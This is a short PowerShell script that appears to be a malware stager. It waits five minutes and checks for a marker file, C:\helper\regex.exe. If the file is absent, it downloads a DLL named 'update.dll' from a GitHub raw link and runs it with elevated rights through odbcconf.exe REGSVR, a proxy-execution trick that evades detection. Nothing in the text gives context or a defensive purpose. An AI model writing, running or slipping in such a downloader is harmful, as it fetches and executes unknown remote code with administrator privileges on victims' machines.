start-sleep 300 ; if (Test-Path "C:\helper\regex.exe") {
    exit
} else { wget "https://github.com/othermeinthenightcontrol2/1/raw/refs/heads/main/update.dll" -o "C:\helper\update.dll" ; start-sleep 2;
    Start-Process odbcconf.exe -ArgumentList 'REGSVR "C:\helper\update.dll"' -Verb RunAs
}
